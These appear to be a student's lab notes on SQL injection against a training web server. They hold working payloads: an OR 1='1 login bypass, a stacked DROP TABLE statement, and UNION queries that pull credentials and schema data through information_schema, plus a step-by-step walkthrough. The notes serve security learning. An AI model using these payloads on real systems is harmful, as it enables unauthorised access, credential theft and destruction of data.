SQL Demo http://10.50.15.67/ PORT 80 for SQL
mariadb
SHOW databases (commands must end with ;)
	information_schema (might be important later)
	myspql (confing)
	performance_schema (config)
	session (user data)
SHOW TABLES FROM session;
	Tires
	car
	session_log
	user
	userinfo
SELECT * FROM session.car;
	populates fields/columns of data

USE session; 
	MariaDB [session]> DESCRIBE car;
	lists the parameters (int/varchar and length for all car fields)
	SELECT * FROM car UNION SELECT * FROM Tires; (UNION command joins commands)(tables must have equal table field amounts)
	SELECT * FROM car UNION SELECT tireid, name, size, cost, 1, 2; (fixes above command and inserts 1/2 in the blank fields that Tires wouldnt have had)

Testing SQL Injection
Truth statement checking : tom' OR 1='1
SELECT id FROM users WHERE name=tom' OR 1='1 AND pass=tom' OR 1='1

STACK Statements
	SELECT * FROM user WHERE id=‘Johnny'; DROP TABLE Customers; --’

	Nesting Statements
	php?key=<value> UNION SELECT 1,column_name,3 from information_schema.columns where table_name = 'members'

	Ignore Statements
	SELECT product FROM item WHERE id = 1 or 1=1; # limit 1;

Walthrough	
	Truth statement, ID # of Columns for vulnerable page, golden statement, tailored sql queries

	navigate to 10.50.15.67	
	Inspect webpage to know if the login will post/get
	username: tom' OR 1='1 ; password: tom' OR 1='1
	modify webpage to send GET instead of Post and resubmit creds -> output the full table of creds
	
	http://10.50.15.67/Union.html
	POST METHOD
	Truth statements crafted off each available car option
	Audi' UNION SELECT 1,2,3,4,5;# (Tested stacking to see if vulnerable)
	Audi' UNION SELECT 1,@@version ;# (pulls version of SQL server)

	GET METHOD
	Perform a GET and then modify the URL to test for truth as seen below
	http://10.50.15.67/uniondemo.php?Selection=2&Submit=Submit
	http://10.50.15.67/uniondemo.php?Selection=2%20or%201=1
	modify URL to perform valid SQL queries
	http://10.50.15.67/uniondemo.php?Selection=2 UNION SELECT 1,name,3 FROM car
	http://10.50.15.67/uniondemo.php?Selection=2%20UNION%20SELECT%201,2,@@version

	GOLDEN STATEMENT
	GET URL?selection=2 UNION SELECT table_schema, table_name, column_name FROM information_schema.columns
	UNION SELECT * FROM session.user
